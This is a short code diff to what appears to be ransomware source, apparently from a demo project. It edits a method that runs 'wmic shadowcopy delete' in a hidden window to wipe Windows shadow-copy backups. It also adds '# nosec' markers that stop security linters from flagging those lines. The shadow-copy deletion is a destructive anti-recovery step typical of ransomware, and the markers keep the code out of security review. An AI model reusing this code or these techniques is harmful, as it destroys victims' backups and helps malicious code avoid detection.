@@ -1,6 +1,6 @@
 from os.path import isfile, isdir
 from os import rename, remove
-from subprocess import call
+from subprocess import call  # nosec
 from demos.fokusrnware.native.ransomware.Encrypter import Encrypter
 from win32api import GetLogicalDriveStrings
 from glob import glob
@@ -60,8 +60,8 @@ class Rmware:
     def delShadowCopy(self) -> None:
         # uses wmic to delete all shadowcopies on the system
         # (must be executet with elevated / admin rights)
-        call('wmic shadowcopy delete', shell=True,
-             creationflags=self.CREATE_NO_WINDOW)
+        call('cmd /c wmic shadowcopy delete', shell=False,
+             creationflags=self.CREATE_NO_WINDOW)  # nosec
 
     '''
         Lists all drives on the windows-system.
